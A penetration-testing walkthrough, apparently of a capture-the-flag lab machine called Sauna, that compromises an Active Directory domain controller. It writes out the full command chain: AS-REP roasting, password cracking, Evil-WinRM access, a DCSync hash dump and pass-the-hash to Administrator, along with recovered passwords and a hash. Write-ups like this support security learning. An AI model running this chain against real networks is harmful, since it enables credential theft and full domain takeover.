# Sauna - Penetration Testing Walkthrough (Extended Markdown Report)

This report documents the complete exploitation of the **Sauna** target machine (IP: `10.129.126.209`).  
It includes enumeration, Kerberos-based attacks, privilege escalation, and root flag retrieval.  
All images are referenced as relative links to the `images/` directory.

---

## üß≠ Enumeration

We began with a full Nmap scan to identify all open TCP ports and services running on the target host:

```bash
nmap -p- -Pn 10.129.126.209 -v -T5 --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn 10.129.126.209 -sC -sV -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn 10.129.126.209 -v --script vuln -oN nmap_vuln.txt
```

![Nmap Scan Results](images/image4.png)

The scan revealed **Kerberos (88/tcp)**, **LDAP (389/tcp)**, **SMB (445/tcp)**, and **HTTP (80/tcp)** ‚Äî indicating a typical **Active Directory** environment.  
We noted the hostname references to **EGOTISTICAL-BANK.LOCAL**, confirming a domain controller setup.

---

## üåê Web Enumeration & User Discovery

Browsing the website at `http://10.129.126.209/` led us to an *About* page that listed team members under the ‚ÄúOur Team‚Äù section:

üëâ [http://10.129.126.209/about.html#team](http://10.129.126.209/about.html#team)

![Team Page](images/image3.png)

We extracted the visible names and stored them in `names.txt` for further use.  
These names were likely employee names in the Active Directory domain.

---

## üë§ Username Generation for AD

To generate potential AD usernames from the discovered names, we used the **AD Username Generator** tool available on GitHub:

üîó [https://github.com/mohinparamasivam/AD-Username-Generator](https://github.com/mohinparamasivam/AD-Username-Generator)

Command used:

```bash
python3 username-generate.py -u names.txt -o usernames.txt
```

This generated a structured list of usernames in formats such as `fsmith`, `hturner`, etc.

---

## üß± Kerberos Enumeration (AS-REP Roast)

Next, we checked whether any user accounts had **pre-authentication disabled**, allowing us to perform an **AS-REP Roast attack** using Impacket‚Äôs `GetNPUsers.py`:

```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.129.126.209 -usersfile usernames.txt -outputfile asrep_users
```

![AS-REP Output](images/image1.png)

We successfully retrieved an AS-REP hash for **fsmith**, meaning that user account did not require pre-authentication.

We then cracked the hash using **John the Ripper**:

```bash
john --wordlist=rockyou.txt hash.txt
```

![Password Crack](images/image2.png)

The password `Thestrokes23` was successfully recovered, providing valid domain credentials.

---

## üíª Initial Access (Evil-WinRM)

With credentials obtained for **fsmith**, we established a PowerShell session on the target via **Evil-WinRM**:

```bash
evil-winrm -i 10.129.126.209 -u fsmith -p Thestrokes23
```

![Evil-WinRM Access](images/image9.png)

The shell connected successfully, confirming our foothold as **fsmith**.  
The **user flag** was located on FSmith‚Äôs desktop.

---

## ‚öôÔ∏è Privilege Escalation - Local Enumeration

To identify potential escalation vectors, we ran **WinPEAS**, an automated Windows privilege escalation script:

![WinPEAS Output](images/image5.png)

The enumeration revealed **Winlogon credentials** and multiple service accounts, including **svc_loanmanager**.  
We exported the results and cross-referenced them with **BloodHound** to visualize privilege relationships.

---

## üß† Domain Privilege Escalation via DCSync

In BloodHound, the **svc_loanmanager** account was shown to have **DCSync privileges**, allowing replication of password hashes from the domain controller:

![Bloodhound DCSync](images/image7.png)

We executed a **DCSync attack** using Impacket‚Äôs `secretsdump.py`:

```bash
impacket-secretsdump 'EGOTISTICAL-BANK.LOCAL'/'svc_loanmgr':'Moneymakestheworldgoround!'@'10.129.126.209'
```

![Secretsdump Output](images/image8.png)

This successfully dumped the **NTLM hash for Administrator**.

---

## üß© Pass-the-Hash Attack and Root Access

We then performed a **pass-the-hash** login with Evil-WinRM using the extracted Administrator hash:

```bash
evil-winrm -i 10.129.126.209 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

![Administrator Shell](images/image6.png)

We gained access as **Administrator**.  
The **root flag** was found on the Administrator‚Äôs desktop:

```
C:\Users\Administrator\Desktop\root.txt
```

---

## ‚úÖ Conclusion

This engagement illustrates a full compromise of an Active Directory environment via enumeration and Kerberos exploitation.

**Attack Summary:**
1. Enumerated AD services via Nmap.  
2. Extracted usernames from the company‚Äôs website.  
3. Performed AS-REP Roast to retrieve and crack a user hash.  
4. Gained foothold as **fsmith** using Evil-WinRM.  
5. Discovered a service account with DCSync rights via BloodHound.  
6. Extracted Administrator hashes using Impacket.  
7. Performed pass-the-hash to obtain full system compromise.
